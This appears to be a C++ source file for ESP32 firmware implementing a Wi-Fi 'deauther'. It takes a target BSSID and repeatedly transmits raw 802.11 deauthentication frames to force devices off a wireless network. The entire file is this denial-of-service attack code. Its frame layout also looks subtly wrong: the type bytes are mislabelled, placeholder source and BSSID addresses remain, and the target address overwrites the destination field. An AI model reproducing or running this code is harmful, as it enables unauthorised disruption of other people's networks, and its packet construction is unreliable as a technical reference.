//
// Created by Ikken on 9/8/2023.
//

#include "Deauther.h"


Deauther::Deauther() {}

void Deauther::deauth(const char *targetBSSID, int count) {
    uint8_t targetMAC[6];
    sscanf(targetBSSID, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetMAC[0], &targetMAC[1], &targetMAC[2],  // OUI
           &targetMAC[3], &targetMAC[4], &targetMAC[5]); // NIC

    for (int i = 0; i < count; i++) {
        send_deauth_packet(targetMAC);
        delay(50); // Add a delay between deauth packets
    }
}

void Deauther::send_deauth_packet(const uint8_t *targetMAC) {
    // Construct deauth packet
    uint8_t deauthPacket[] = {
            // 802.11 header
            0x08, 0x00, // Type/Subtype: Management Deauthentication
            0x00, 0x00, // Flags
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC address (broadcast)
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, // Source MAC address (ESP32 MAC address)
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, // BSSID (same as source MAC address for deauth)
            0x00, 0x00, // Sequence number
            0xC0, 0x00 // Deauthentication frame body, Reason Code: Unspecified Reason
    };

    // Set the destination MAC address in the packet
    memcpy(&deauthPacket[4], targetMAC, 6);

    // Send the packet using raw Wi-Fi frames
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}
